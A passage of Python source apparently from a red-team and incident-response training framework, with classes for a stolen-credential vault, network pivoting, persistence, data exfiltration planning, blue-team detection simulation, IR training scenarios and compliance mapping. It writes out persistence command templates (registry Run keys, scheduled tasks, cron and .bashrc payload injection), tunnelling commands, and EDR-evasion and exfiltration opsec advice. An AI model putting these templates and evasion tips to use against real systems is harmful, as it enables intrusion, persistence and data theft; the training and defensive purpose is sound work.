            'azure_token': {'icon': 'üîµ', 'priority': 5},
            'gcp_service_account': {'icon': 'üü¢', 'priority': 5},
            'database_creds': {'icon': 'üóÑÔ∏è', 'priority': 4},
            'smtp_creds': {'icon': 'üìß', 'priority': 3},
            'vpn_creds': {'icon': 'üõ°Ô∏è', 'priority': 4}
        }
        self.cracking_queue: List[str] = []
        self.usage_log: List[Dict[str, Any]] = []
        
    def add_credential(self, username: str, credential_value: str, 
                      credential_type: str, source: str,
                      target_system: str = "", metadata: Dict = None) -> str:
        """Add a credential to the vault."""
        cred_id = f"CRED-{len(self.credentials)+1:05d}"
        
        self.credentials[cred_id] = {
            'id': cred_id,
            'username': username,
            'value': credential_value,
            'type': credential_type,
            'source': source,
            'target_system': target_system,
            'metadata': metadata or {},
            'added_at': datetime.now().isoformat(),
            'last_verified': None,
            'is_valid': True,
            'times_used': 0,
            'cracked': credential_type.startswith('hash'),
            'plaintext': None if credential_type.startswith('hash') else credential_value,
            'priority': self.credential_types.get(credential_type, {}).get('priority', 1)
        }
        
        if credential_type.startswith('hash'):
            self.cracking_queue.append(cred_id)
            
        return cred_id
    
    def mark_cracked(self, cred_id: str, plaintext: str) -> bool:
        """Mark a hash credential as cracked."""
        if cred_id in self.credentials:
            self.credentials[cred_id]['cracked'] = True
            self.credentials[cred_id]['plaintext'] = plaintext
            if cred_id in self.cracking_queue:
                self.cracking_queue.remove(cred_id)
            return True
        return False
    
    def use_credential(self, cred_id: str, target: str, technique: str) -> bool:
        """Log credential usage."""
        if cred_id in self.credentials:
            self.credentials[cred_id]['times_used'] += 1
            self.usage_log.append({
                'credential_id': cred_id,
                'target': target,
                'technique': technique,
                'timestamp': datetime.now().isoformat()
            })
            return True
        return False
    
    def get_credentials_for_target(self, target: str) -> List[Dict[str, Any]]:
        """Get all credentials applicable to a target."""
        applicable = []
        for cred in self.credentials.values():
            if cred['target_system'] == target or not cred['target_system']:
                applicable.append(cred)
        return sorted(applicable, key=lambda x: x['priority'], reverse=True)
    
    def get_by_type(self, cred_type: str) -> List[Dict[str, Any]]:
        """Get all credentials of a specific type."""
        return [c for c in self.credentials.values() if c['type'] == cred_type]
    
    def get_high_value_credentials(self) -> List[Dict[str, Any]]:
        """Get high-priority credentials."""
        return [c for c in self.credentials.values() if c['priority'] >= 4]
    
    def generate_password_list(self) -> List[str]:
        """Generate password list from cracked credentials."""
        passwords = []
        for cred in self.credentials.values():
            if cred['plaintext']:
                passwords.append(cred['plaintext'])
        return list(set(passwords))
    
    def get_vault_summary(self) -> Dict[str, Any]:
        """Get summary of credential vault."""
        type_counts = {}
        for cred in self.credentials.values():
            ctype = cred['type']
            type_counts[ctype] = type_counts.get(ctype, 0) + 1
            
        return {
            'total_credentials': len(self.credentials),
            'by_type': type_counts,
            'pending_cracking': len(self.cracking_queue),
            'high_value': len(self.get_high_value_credentials()),
            'total_usages': len(self.usage_log)
        }


class NetworkPivotManager:
    """Manage lateral movement and network pivoting."""
    
    def __init__(self):
        self.compromised_hosts: Dict[str, Dict[str, Any]] = {}
        self.pivot_routes: List[Dict[str, Any]] = []
        self.tunnels: Dict[str, Dict[str, Any]] = {}
        self.network_segments: Dict[str, Dict[str, Any]] = {}
        
    def add_compromised_host(self, hostname: str, ip_address: str,
                            os_type: str, access_level: str,
                            credentials_used: str = None) -> str:
        """Register a newly compromised host."""
        host_id = f"HOST-{len(self.compromised_hosts)+1:04d}"
        
        self.compromised_hosts[host_id] = {
            'id': host_id,
            'hostname': hostname,
            'ip_address': ip_address,
            'os_type': os_type,
            'access_level': access_level,
            'credentials_used': credentials_used,
            'compromised_at': datetime.now().isoformat(),
            'interfaces': [],
            'running_services': [],
            'installed_tools': [],
            'persistence_methods': [],
            'data_found': [],
            'is_pivot_point': False,
            'segment': self._detect_segment(ip_address)
        }
        
        return host_id
    
    def _detect_segment(self, ip_address: str) -> str:
        """Detect network segment from IP."""
        parts = ip_address.split('.')
        if len(parts) >= 3:
            return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        return "unknown"
    
    def add_network_interface(self, host_id: str, interface: str,
                             ip_address: str, network: str):
        """Add network interface to host."""
        if host_id in self.compromised_hosts:
            self.compromised_hosts[host_id]['interfaces'].append({
                'interface': interface,
                'ip_address': ip_address,
                'network': network
            })
            self.compromised_hosts[host_id]['is_pivot_point'] = \
                len(self.compromised_hosts[host_id]['interfaces']) > 1
    
    def create_pivot_route(self, source_host: str, target_network: str,
                          pivot_host: str, tunnel_type: str) -> str:
        """Create a pivot route through a compromised host."""
        route_id = f"PIVOT-{len(self.pivot_routes)+1:04d}"
        
        route = {
            'id': route_id,
            'source': source_host,
            'target_network': target_network,
            'pivot_host': pivot_host,
            'tunnel_type': tunnel_type,  # ssh, meterpreter, chisel, ligolo
            'created_at': datetime.now().isoformat(),
            'status': 'active',
            'bytes_transferred': 0
        }
        
        self.pivot_routes.append(route)
        return route_id
    
    def create_tunnel(self, tunnel_type: str, local_port: int,
                     remote_host: str, remote_port: int,
                     pivot_host: str = None) -> str:
        """Create a network tunnel."""
        tunnel_id = f"TUN-{len(self.tunnels)+1:04d}"
        
        tunnel_configs = {
            'ssh_local': f"ssh -L {local_port}:{remote_host}:{remote_port} pivot@{pivot_host}",
            'ssh_dynamic': f"ssh -D {local_port} pivot@{pivot_host}",
            'ssh_remote': f"ssh -R {local_port}:{remote_host}:{remote_port} pivot@{pivot_host}",
            'chisel_client': f"chisel client {pivot_host}:{local_port} R:{remote_port}:{remote_host}:{remote_port}",
            'ligolo': f"ligolo-ng -connect {pivot_host}:{local_port}",
            'socat': f"socat TCP-LISTEN:{local_port},fork TCP:{remote_host}:{remote_port}"
        }
        
        self.tunnels[tunnel_id] = {
            'id': tunnel_id,
            'type': tunnel_type,
            'local_port': local_port,
            'remote_host': remote_host,
            'remote_port': remote_port,
            'pivot_host': pivot_host,
            'command': tunnel_configs.get(tunnel_type, ''),
            'status': 'active',
            'created_at': datetime.now().isoformat()
        }
        
        return tunnel_id
    
    def get_reachable_networks(self) -> List[str]:
        """Get all networks reachable through current pivots."""
        networks = set()
        for host in self.compromised_hosts.values():
            networks.add(host['segment'])
            for iface in host['interfaces']:
                networks.add(iface['network'])
        return list(networks)
    
    def find_path_to_target(self, target_ip: str) -> List[Dict[str, Any]]:
        """Find pivot path to reach target IP."""
        target_segment = self._detect_segment(target_ip)
        path = []
        
        for host in self.compromised_hosts.values():
            for iface in host['interfaces']:
                if iface['network'] == target_segment:
                    path.append({
                        'hop': len(path) + 1,
                        'host': host['hostname'],
                        'interface': iface['interface'],
                        'via_network': iface['network']
                    })
                    break
                    
        return path
    
    def generate_pivoting_diagram(self) -> str:
        """Generate ASCII diagram of pivot network."""
        lines = ["=" * 60, "üåê NETWORK PIVOT DIAGRAM", "=" * 60, ""]
        
        # Group hosts by segment
        segments: Dict[str, List] = {}
        for host in self.compromised_hosts.values():
            seg = host['segment']
            if seg not in segments:
                segments[seg] = []
            segments[seg].append(host)
        
        for segment, hosts in segments.items():
            lines.append(f"‚îå{'‚îÄ' * 56}‚îê")
            lines.append(f"‚îÇ Segment: {segment:<44} ‚îÇ")
            lines.append(f"‚îú{'‚îÄ' * 56}‚î§")
            
            for host in hosts:
                pivot_mark = "üîÑ" if host['is_pivot_point'] else "  "
                lines.append(f"‚îÇ {pivot_mark} {host['hostname']:<20} ({host['ip_address']:<15}) ‚îÇ")
                
            lines.append(f"‚îî{'‚îÄ' * 56}‚îò")
            lines.append("")
        
        # Show tunnels
        if self.tunnels:
            lines.append("üöá ACTIVE TUNNELS:")
            for tunnel in self.tunnels.values():
                lines.append(f"   [{tunnel['id']}] {tunnel['type']}: "
                           f"localhost:{tunnel['local_port']} -> "
                           f"{tunnel['remote_host']}:{tunnel['remote_port']}")
        
        return "\n".join(lines)


class PersistenceMechanismLibrary:
    """Library of persistence mechanisms for different platforms."""
    
    def __init__(self):
        self.mechanisms: Dict[str, List[Dict[str, Any]]] = {
            'windows': [
                {
                    'name': 'Registry Run Keys',
                    'technique_id': 'T1547.001',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_admin': False,
                    'locations': [
                        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
                        r'HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
                    ],
                    'command': 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {name} /t REG_SZ /d "{payload}" /f'
                },
                {
                    'name': 'Scheduled Task',
                    'technique_id': 'T1053.005',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_admin': False,
                    'command': 'schtasks /create /tn "{name}" /tr "{payload}" /sc onlogon /ru %USERNAME%'
                },
                {
                    'name': 'WMI Event Subscription',
                    'technique_id': 'T1546.003',
                    'detection_risk': 'low',
                    'survives_reboot': True,
                    'requires_admin': True,
                    'command': 'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE ...'
                },
                {
                    'name': 'Startup Folder',
                    'technique_id': 'T1547.001',
                    'detection_risk': 'high',
                    'survives_reboot': True,
                    'requires_admin': False,
                    'location': r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'
                },
                {
                    'name': 'DLL Search Order Hijacking',
                    'technique_id': 'T1574.001',
                    'detection_risk': 'low',
                    'survives_reboot': True,
                    'requires_admin': False
                },
                {
                    'name': 'Service Installation',
                    'technique_id': 'T1543.003',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_admin': True,
                    'command': 'sc create {name} binPath= "{payload}" start= auto'
                },
                {
                    'name': 'COM Hijacking',
                    'technique_id': 'T1546.015',
                    'detection_risk': 'low',
                    'survives_reboot': True,
                    'requires_admin': False
                },
                {
                    'name': 'AppInit_DLLs',
                    'technique_id': 'T1546.010',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_admin': True
                },
                {
                    'name': 'Accessibility Features',
                    'technique_id': 'T1546.008',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_admin': True
                },
                {
                    'name': 'Golden Ticket',
                    'technique_id': 'T1558.001',
                    'detection_risk': 'very_low',
                    'survives_reboot': True,
                    'requires_admin': True,
                    'requires_dc_access': True
                }
            ],
            'linux': [
                {
                    'name': 'Cron Job',
                    'technique_id': 'T1053.003',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_root': False,
                    'command': '(crontab -l 2>/dev/null; echo "* * * * * {payload}") | crontab -'
                },
                {
                    'name': 'Systemd Service',
                    'technique_id': 'T1543.002',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_root': True,
                    'location': '/etc/systemd/system/{name}.service'
                },
                {
                    'name': 'Bashrc/Profile',
                    'technique_id': 'T1546.004',
                    'detection_risk': 'low',
                    'survives_reboot': True,
                    'requires_root': False,
                    'command': 'echo "{payload}" >> ~/.bashrc'
                },
                {
                    'name': 'SSH Authorized Keys',
                    'technique_id': 'T1098.004',
                    'detection_risk': 'low',
                    'survives_reboot': True,
                    'requires_root': False,
                    'location': '~/.ssh/authorized_keys'
                },
                {
                    'name': 'Init Script',
                    'technique_id': 'T1037.004',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_root': True,
                    'location': '/etc/init.d/'
                },
                {
                    'name': 'LD_PRELOAD',
                    'technique_id': 'T1574.006',
                    'detection_risk': 'low',
                    'survives_reboot': True,
                    'requires_root': True
                },
                {
                    'name': 'PAM Backdoor',
                    'technique_id': 'T1556.003',
                    'detection_risk': 'very_low',
                    'survives_reboot': True,
                    'requires_root': True
                },
                {
                    'name': 'Kernel Module',
                    'technique_id': 'T1547.006',
                    'detection_risk': 'very_low',
                    'survives_reboot': True,
                    'requires_root': True
                }
            ],
            'macos': [
                {
                    'name': 'LaunchAgent',
                    'technique_id': 'T1543.001',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_root': False,
                    'location': '~/Library/LaunchAgents/'
                },
                {
                    'name': 'LaunchDaemon',
                    'technique_id': 'T1543.004',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_root': True,
                    'location': '/Library/LaunchDaemons/'
                },
                {
                    'name': 'Login Items',
                    'technique_id': 'T1547.015',
                    'detection_risk': 'high',
                    'survives_reboot': True,
                    'requires_root': False
                },
                {
                    'name': 'Cron Job',
                    'technique_id': 'T1053.003',
                    'detection_risk': 'medium',
                    'survives_reboot': True,
                    'requires_root': False
                },
                {
                    'name': 'Dylib Hijacking',
                    'technique_id': 'T1574.004',
                    'detection_risk': 'low',
                    'survives_reboot': True,
                    'requires_root': False
                }
            ],
            'cloud': [
                {
                    'name': 'IAM User Creation',
                    'platform': 'AWS',
                    'technique_id': 'T1136.003',
                    'detection_risk': 'medium',
                    'command': 'aws iam create-user --user-name {name}'
                },
                {
                    'name': 'Lambda Backdoor',
                    'platform': 'AWS',
                    'technique_id': 'T1059',
                    'detection_risk': 'low'
                },
                {
                    'name': 'Service Principal',
                    'platform': 'Azure',
                    'technique_id': 'T1136.003',
                    'detection_risk': 'medium'
                },
                {
                    'name': 'OAuth App',
                    'platform': 'Azure/M365',
                    'technique_id': 'T1098.003',
                    'detection_risk': 'low'
                },
                {
                    'name': 'Service Account Key',
                    'platform': 'GCP',
                    'technique_id': 'T1098',
                    'detection_risk': 'medium'
                }
            ]
        }
        
        self.deployed_persistence: List[Dict[str, Any]] = []
        
    def get_mechanisms_for_os(self, os_type: str, 
                              has_admin: bool = False) -> List[Dict[str, Any]]:
        """Get applicable persistence mechanisms."""
        os_key = os_type.lower()
        if os_key not in self.mechanisms:
            return []
            
        mechanisms = self.mechanisms[os_key]
        if not has_admin:
            mechanisms = [m for m in mechanisms 
                         if not m.get('requires_admin', False) 
                         and not m.get('requires_root', False)]
        
        return sorted(mechanisms, key=lambda x: x['detection_risk'])
    
    def deploy_persistence(self, mechanism_name: str, host_id: str,
                          payload_path: str, custom_name: str = None) -> str:
        """Record a deployed persistence mechanism."""
        deploy_id = f"PERSIST-{len(self.deployed_persistence)+1:04d}"
        
        self.deployed_persistence.append({
            'id': deploy_id,
            'mechanism': mechanism_name,
            'host_id': host_id,
            'payload': payload_path,
            'name': custom_name or f"legit_service_{deploy_id}",
            'deployed_at': datetime.now().isoformat(),
            'status': 'active',
            'last_checked': None
        })
        
        return deploy_id
    
    def get_stealthiest_mechanisms(self, os_type: str, 
                                   count: int = 3) -> List[Dict[str, Any]]:
        """Get the stealthiest persistence options."""
        mechanisms = self.mechanisms.get(os_type.lower(), [])
        risk_order = {'very_low': 0, 'low': 1, 'medium': 2, 'high': 3}
        sorted_mech = sorted(mechanisms, 
                            key=lambda x: risk_order.get(x['detection_risk'], 99))
        return sorted_mech[:count]


class DataExfiltrationPlanner:
    """Plan and track data exfiltration operations."""
    
    def __init__(self):
        self.exfil_channels: Dict[str, Dict[str, Any]] = {
            'dns_tunneling': {
                'name': 'DNS Tunneling',
                'technique_id': 'T1048.003',
                'bandwidth': 'low',
                'stealth': 'high',
                'tools': ['dnscat2', 'iodine', 'dns2tcp'],
                'blocked_by': ['DNS monitoring', 'DNS sinkhole'],
                'max_speed_kbps': 50
            },
            'https': {
                'name': 'HTTPS Upload',
                'technique_id': 'T1048.001',
                'bandwidth': 'high',
                'stealth': 'medium',
                'tools': ['curl', 'wget', 'custom_c2'],
                'blocked_by': ['SSL inspection', 'Proxy whitelist'],
                'max_speed_kbps': 10000
            },
            'cloud_storage': {
                'name': 'Cloud Storage',
                'technique_id': 'T1567.002',
                'bandwidth': 'high',
                'stealth': 'medium',
                'tools': ['rclone', 'aws cli', 'azcopy'],
                'blocked_by': ['CASB', 'DLP'],
                'providers': ['AWS S3', 'Azure Blob', 'Google Drive', 'Dropbox']
            },
            'icmp': {
                'name': 'ICMP Tunneling',
                'technique_id': 'T1048',
                'bandwidth': 'very_low',
                'stealth': 'high',
                'tools': ['icmpsh', 'ptunnel'],
                'blocked_by': ['ICMP blocked'],
                'max_speed_kbps': 10
            },
            'email': {
                'name': 'Email Exfiltration',
                'technique_id': 'T1048.003',
                'bandwidth': 'medium',
                'stealth': 'low',
                'tools': ['smtp client', 'outlook'],
                'blocked_by': ['Email DLP', 'Attachment scanning']
            },
            'physical': {
                'name': 'Physical Media',
                'technique_id': 'T1052.001',
                'bandwidth': 'very_high',
                'stealth': 'low',
                'tools': ['USB drive'],
                'blocked_by': ['Device control', 'Physical security']
            },
            'steganography': {
                'name': 'Steganography',
                'technique_id': 'T1027.003',
                'bandwidth': 'very_low',
                'stealth': 'very_high',
                'tools': ['steghide', 'outguess'],
                'blocked_by': ['Steg detection'],
                'carrier_types': ['images', 'audio', 'video']
            },
            'scheduled_transfer': {
                'name': 'Scheduled Transfer',
                'technique_id': 'T1029',
                'bandwidth': 'variable',
                'stealth': 'high',
                'description': 'Exfil during business hours or specific times'
            }
        }
        
        self.data_targets: List[Dict[str, Any]] = []
        self.exfil_operations: List[Dict[str, Any]] = []
        
    def add_data_target(self, name: str, path: str, size_mb: float,
                       sensitivity: str, data_type: str) -> str:
        """Add a data target for exfiltration."""
        target_id = f"DATA-{len(self.data_targets)+1:04d}"
        
        self.data_targets.append({
            'id': target_id,
            'name': name,
            'path': path,
            'size_mb': size_mb,
            'sensitivity': sensitivity,  # low, medium, high, critical
            'data_type': data_type,  # pii, financial, credentials, source_code, etc
            'discovered_at': datetime.now().isoformat(),
            'exfiltrated': False,
            'compression_ratio': 0.3 if data_type == 'source_code' else 0.7
        })
        
        return target_id
    
    def plan_exfiltration(self, target_ids: List[str], 
                         channel: str) -> Dict[str, Any]:
        """Plan exfiltration operation."""
        targets = [t for t in self.data_targets if t['id'] in target_ids]
        channel_info = self.exfil_channels.get(channel, {})
        
        total_size = sum(t['size_mb'] for t in targets)
        compressed_size = sum(t['size_mb'] * t.get('compression_ratio', 0.5) 
                             for t in targets)
        
        max_speed = channel_info.get('max_speed_kbps', 1000)
        estimated_time_minutes = (compressed_size * 1024) / (max_speed * 60)
        
        return {
            'targets': targets,
            'channel': channel,
            'channel_info': channel_info,
            'total_size_mb': total_size,
            'compressed_size_mb': compressed_size,
            'estimated_time_minutes': estimated_time_minutes,
            'recommended_schedule': self._recommend_schedule(estimated_time_minutes),
            'opsec_considerations': self._get_opsec_notes(channel, total_size)
        }
    
    def _recommend_schedule(self, duration_minutes: float) -> str:
        """Recommend exfiltration schedule."""
        if duration_minutes < 5:
            return "Can be done in single session"
        elif duration_minutes < 30:
            return "Schedule during business hours to blend with normal traffic"
        elif duration_minutes < 120:
            return "Split into multiple sessions over several days"
        else:
            return "Use chunked transfer over extended period (weeks)"
    
    def _get_opsec_notes(self, channel: str, size_mb: float) -> List[str]:
        """Get operational security considerations."""
        notes = []
        
        if size_mb > 100:
            notes.append("‚ö†Ô∏è Large transfer - consider chunking")
        if channel == 'dns_tunneling':
            notes.append("Monitor for DNS query volume anomaly detection")
        if channel == 'https':
            notes.append("Use legitimate-looking domains and certificates")
        if channel == 'cloud_storage':
            notes.append("Use personal accounts or compromised corporate accounts")
        if channel == 'email':
            notes.append("Consider encryption to avoid DLP keyword matching")
            
        notes.append("Encrypt all data before exfiltration")
        notes.append("Remove artifacts after completion")
        
        return notes
    
    def start_exfil_operation(self, plan: Dict[str, Any]) -> str:
        """Start an exfiltration operation."""
        op_id = f"EXFIL-{len(self.exfil_operations)+1:04d}"
        
        self.exfil_operations.append({
            'id': op_id,
            'plan': plan,
            'started_at': datetime.now().isoformat(),
            'status': 'in_progress',
            'bytes_transferred': 0,
            'chunks_completed': 0
        })
        
        return op_id


class BlueTeamSimulator:
    """Simulate blue team detection and response."""
    
    def __init__(self):
        self.detection_rules: Dict[str, Dict[str, Any]] = {
            'sigma_process_creation': {
                'name': 'Suspicious Process Creation',
                'type': 'sigma',
                'detects': ['T1059', 'T1106', 'T1053'],
                'log_source': 'windows/security',
                'severity': 'medium'
            },
            'sigma_network_connection': {
                'name': 'Suspicious Network Connection',
                'type': 'sigma',
                'detects': ['T1071', 'T1095', 'T1572'],
                'log_source': 'network',
                'severity': 'medium'
            },
            'yara_webshell': {
                'name': 'WebShell Detection',
                'type': 'yara',
                'detects': ['T1505.003'],
                'scan_location': 'web_directories',
                'severity': 'critical'
            },
            'edr_behavior': {
                'name': 'EDR Behavioral Detection',
                'type': 'edr',
                'detects': ['T1055', 'T1003', 'T1547'],
                'severity': 'high'
            },
            'ndr_lateral': {
                'name': 'NDR Lateral Movement',
                'type': 'ndr',
                'detects': ['T1021', 'T1570', 'T1080'],
                'severity': 'high'
            },
            'siem_correlation': {
                'name': 'SIEM Correlation Rule',
                'type': 'siem',
                'detects': ['multi_stage_attack'],
                'severity': 'critical',
                'requires_multiple_events': True
            }
        }
        
        self.security_tools: Dict[str, Dict[str, Any]] = {
            'crowdstrike_falcon': {
                'type': 'edr',
                'detection_rate': 0.92,
                'response_capabilities': ['isolate', 'remediate', 'rollback'],
                'evasion_difficulty': 'hard'
            },
            'microsoft_defender': {
                'type': 'edr',
                'detection_rate': 0.85,
                'response_capabilities': ['isolate', 'remediate'],
                'evasion_difficulty': 'medium'
            },
            'carbon_black': {
                'type': 'edr',
                'detection_rate': 0.88,
                'response_capabilities': ['isolate', 'ban_hash'],
                'evasion_difficulty': 'medium'
            },
            'splunk': {
                'type': 'siem',
                'log_retention_days': 90,
                'correlation_capabilities': True
            },
            'palo_alto': {
                'type': 'firewall',
                'ssl_inspection': True,
                'threat_prevention': True
            },
            'darktrace': {
                'type': 'ndr',
                'detection_rate': 0.78,
                'uses_ml': True
            }
        }
        
        self.incident_response_playbooks: Dict[str, List[str]] = {
            'malware_detected': [
                'Isolate affected endpoint',
                'Collect memory dump',
                'Identify IOCs',
                'Search for similar activity',
                'Block hashes and IPs',
                'Remediate and restore'
            ],
            'credential_theft': [
                'Disable affected accounts',
                'Reset passwords',
                'Revoke active sessions',
                'Audit account activity',
                'Enable additional MFA'
            ],
            'data_exfiltration': [
                'Block C2 communications',
                'Identify data accessed',
                'Preserve evidence',
                'Notify legal/compliance',
                'Begin breach notification process'
            ],
            'ransomware': [
                'Isolate affected systems immediately',
                'Disable network shares',
                'Identify ransomware variant',
                'Begin restore from backups',
                'Engage incident response team'
            ]
        }
        
    def simulate_detection(self, technique_id: str, 
                          deployed_tools: List[str]) -> Dict[str, Any]:
        """Simulate whether an attack would be detected."""
        detections = []
        
        for rule_id, rule in self.detection_rules.items():
            if technique_id in rule.get('detects', []):
                # Check if relevant tool is deployed
                for tool_name in deployed_tools:
                    tool = self.security_tools.get(tool_name, {})
                    if rule['type'] == tool.get('type'):
                        detection_chance = tool.get('detection_rate', 0.5)
                        detected = random.random() < detection_chance
                        detections.append({
                            'rule': rule['name'],
                            'tool': tool_name,
                            'detected': detected,
                            'severity': rule['severity'],
                            'detection_chance': detection_chance
                        })
        
        overall_detected = any(d['detected'] for d in detections)
        
        return {
            'technique_id': technique_id,
            'detected': overall_detected,
            'detection_details': detections,
            'response_playbook': self._get_response_playbook(technique_id) if overall_detected else None
        }
    
    def _get_response_playbook(self, technique_id: str) -> List[str]:
        """Get appropriate response playbook."""
        # Map techniques to playbook types
        if technique_id in ['T1003', 'T1558', 'T1552']:
            return self.incident_response_playbooks['credential_theft']
        elif technique_id in ['T1486', 'T1490']:
            return self.incident_response_playbooks['ransomware']
        elif technique_id in ['T1048', 'T1567']:
            return self.incident_response_playbooks['data_exfiltration']
        else:
            return self.incident_response_playbooks['malware_detected']
    
    def get_evasion_recommendations(self, 
                                    deployed_tools: List[str]) -> List[str]:
        """Get recommendations for evading deployed security tools."""
        recommendations = []
        
        for tool_name in deployed_tools:
            tool = self.security_tools.get(tool_name, {})
            
            if tool.get('type') == 'edr':
                recommendations.append(f"For {tool_name}: Consider direct syscalls, unhooking, or BYOVD")
            elif tool.get('type') == 'siem':
                recommendations.append(f"For {tool_name}: Minimize log generation, blend with normal activity")
            elif tool.get('type') == 'ndr':
                recommendations.append(f"For {tool_name}: Use encrypted channels, legitimate protocols")
            elif tool.get('ssl_inspection'):
                recommendations.append(f"For {tool_name}: Domain fronting or certificate pinning bypass")
                
        return recommendations
    
    def estimate_response_time(self, severity: str, 
                              is_business_hours: bool = True) -> Dict[str, float]:
        """Estimate defender response times."""
        base_times = {
            'critical': {'detection': 5, 'triage': 15, 'containment': 30},
            'high': {'detection': 15, 'triage': 30, 'containment': 60},
            'medium': {'detection': 60, 'triage': 120, 'containment': 240},
            'low': {'detection': 240, 'triage': 480, 'containment': 1440}
        }
        
        times = base_times.get(severity, base_times['medium']).copy()
        
        if not is_business_hours:
            for key in times:
                times[key] *= 3  # 3x longer response outside business hours
                
        return times


class IncidentResponseTrainer:
    """Training scenarios for incident response."""
    
    def __init__(self):
        self.scenarios: Dict[str, Dict[str, Any]] = {
            'apt_intrusion': {
                'name': 'APT Intrusion Simulation',
                'difficulty': 'advanced',
                'duration_hours': 4,
                'description': 'Simulate a nation-state actor intrusion',
                'attack_phases': [
                    'Initial spearphishing access',
                    'Credential harvesting',
                    'Lateral movement to DC',
                    'Data staging and exfiltration'
                ],
                'learning_objectives': [
                    'Identify initial access vectors',
                    'Trace lateral movement patterns',
                    'Recover exfiltrated data scope'
                ],
                'artifacts_to_find': 15
            },
            'ransomware_outbreak': {
                'name': 'Ransomware Outbreak',
                'difficulty': 'intermediate',
                'duration_hours': 2,
                'description': 'Respond to active ransomware infection',
                'attack_phases': [
                    'Initial access via RDP',
                    'Privilege escalation',
                    'Disable security tools',
                    'Deploy ransomware'
                ],
                'learning_objectives': [
                    'Rapid containment decisions',
                    'Backup verification',
                    'Communication protocols'
                ],
                'artifacts_to_find': 10
            },
            'insider_threat': {
                'name': 'Insider Threat Investigation',
                'difficulty': 'intermediate',
                'duration_hours': 3,
                'description': 'Investigate potential data theft by employee',
                'indicators': [
                    'Unusual file access patterns',
                    'After-hours activity',
                    'USB device usage',
                    'Cloud storage uploads'
                ],
                'learning_objectives': [
                    'User behavior analysis',
                    'Evidence preservation',
                    'HR/Legal coordination'
                ]
            },
            'web_compromise': {
                'name': 'Web Application Compromise',
                'difficulty': 'beginner',
                'duration_hours': 1.5,
                'description': 'Investigate compromised web server',
                'attack_phases': [
                    'SQL injection',
                    'Webshell deployment',
                    'Database exfiltration'
                ],
                'learning_objectives': [
                    'Log analysis techniques',
                    'Webshell identification',
                    'Database audit'
                ],
                'artifacts_to_find': 8
            }
        }
        
        self.training_sessions: List[Dict[str, Any]] = []
        
    def start_scenario(self, scenario_id: str, 
                      participant: str) -> Dict[str, Any]:
        """Start a training scenario."""
        scenario = self.scenarios.get(scenario_id)
        if not scenario:
            return {'error': 'Scenario not found'}
            
        session_id = f"TRAIN-{len(self.training_sessions)+1:04d}"
        
        session = {
            'id': session_id,
            'scenario_id': scenario_id,
            'scenario_name': scenario['name'],
            'participant': participant,
            'started_at': datetime.now().isoformat(),
            'status': 'in_progress',
            'artifacts_found': 0,
            'artifacts_total': scenario.get('artifacts_to_find', 10),
            'score': 0,
            'actions_taken': [],
            'hints_used': 0
        }
        
        self.training_sessions.append(session)
        return session
    
    def record_action(self, session_id: str, action: str, 
                     result: str) -> Dict[str, Any]:
        """Record an action taken during training."""
        for session in self.training_sessions:
            if session['id'] == session_id:
                session['actions_taken'].append({
                    'action': action,
                    'result': result,
                    'timestamp': datetime.now().isoformat()
                })
                
                # Score the action
                if 'correct' in result.lower() or 'found' in result.lower():
                    session['score'] += 10
                    session['artifacts_found'] += 1
                    
                return session
                
        return {'error': 'Session not found'}
    
    def get_scenario_score(self, session_id: str) -> Dict[str, Any]:
        """Calculate final score for scenario."""
        for session in self.training_sessions:
            if session['id'] == session_id:
                scenario = self.scenarios.get(session['scenario_id'], {})
                
                # Calculate various metrics
                time_bonus = 0  # Would calculate based on completion time
                artifact_score = (session['artifacts_found'] / 
                                 session['artifacts_total']) * 100
                hint_penalty = session['hints_used'] * 5
                
                final_score = session['score'] + time_bonus - hint_penalty
                
                grade = 'F'
                if final_score >= 90:
                    grade = 'A'
                elif final_score >= 80:
                    grade = 'B'
                elif final_score >= 70:
                    grade = 'C'
                elif final_score >= 60:
                    grade = 'D'
                
                return {
                    'session_id': session_id,
                    'scenario': session['scenario_name'],
                    'artifacts_found': session['artifacts_found'],
                    'artifacts_total': session['artifacts_total'],
                    'actions_taken': len(session['actions_taken']),
                    'hints_used': session['hints_used'],
                    'final_score': final_score,
                    'grade': grade,
                    'learning_objectives': scenario.get('learning_objectives', [])
                }
                
        return {'error': 'Session not found'}


class ComplianceMapper:
    """Map attack techniques to compliance frameworks."""
    
    def __init__(self):
        self.frameworks: Dict[str, Dict[str, Any]] = {
            'nist_csf': {
                'name': 'NIST Cybersecurity Framework',
                'version': '1.1',
                'functions': ['Identify', 'Protect', 'Detect', 'Respond', 'Recover'],
                'mapping': {
                    'T1190': ['PR.AC-1', 'PR.AC-4', 'DE.CM-1'],
                    'T1566': ['PR.AT-1', 'DE.CM-1', 'DE.CM-4'],
                    'T1003': ['PR.AC-1', 'PR.DS-5', 'DE.CM-3'],
                    'T1021': ['PR.AC-3', 'PR.AC-4', 'DE.CM-1'],
                    'T1486': ['PR.IP-4', 'RS.MI-1', 'RC.RP-1'],
                    'T1048': ['PR.DS-5', 'DE.CM-1', 'DE.AE-1']
                }
            },
            'cis_controls': {
                'name': 'CIS Critical Security Controls',
                'version': '8',
                'mapping': {
                    'T1190': ['CIS.7', 'CIS.12', 'CIS.16'],
                    'T1566': ['CIS.9', 'CIS.14', 'CIS.17'],
                    'T1003': ['CIS.5', 'CIS.6'],
                    'T1021': ['CIS.4', 'CIS.12', 'CIS.13'],
                    'T1486': ['CIS.3', 'CIS.11'],
                    'T1048': ['CIS.3', 'CIS.13']
                }
            },
            'iso_27001': {
                'name': 'ISO 27001:2022',
                'mapping': {
